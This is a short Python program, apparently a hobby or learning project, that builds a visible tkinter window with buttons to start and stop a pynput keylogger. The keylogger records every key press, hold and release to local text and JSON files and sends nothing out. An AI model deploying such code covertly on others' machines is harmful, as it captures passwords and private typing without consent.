import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading

root = tk.Tk()
root.geometry("300x300")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = ""
listener = None   # global listener reference

def update_txt_file(key):
    with open("logs.txt", "w+") as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open("logs.json", "w+") as key_log:
        json.dump(key_list, key_log, indent=4)

def on_press(key):
    global x, key_list

    if x == False:
        key_list.append({"Pressed": str(key)})
        x = True

    if x == True:
        key_list.append({"Held": str(key)})

    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes

    key_list.append({"Released": str(key)})

    if x == True:
        x = False

    key_strokes += str(key)
    update_txt_file(key_strokes)
    update_json_file(key_list)

    if key == keyboard.Key.esc:
        stop_keylogger()
        return False

def start_keylogger():
    global listener
    print("[+] Keylogger started...")
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    listener.start()
    listener.join()

def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        print("[-] Keylogger stopped")

def start_button():
    t = threading.Thread(target=start_keylogger)
    t.daemon = True
    t.start()

# ---------------- GUI ----------------

Label(root, text="Keylogger", font="Verdana 12 bold").pack(pady=20)

Button(root, text="Start Keylogger", width=20, command=start_button).pack(pady=10)
Button(root, text="Stop Keylogger", width=20, command=stop_keylogger).pack(pady=10)

root.mainloop()
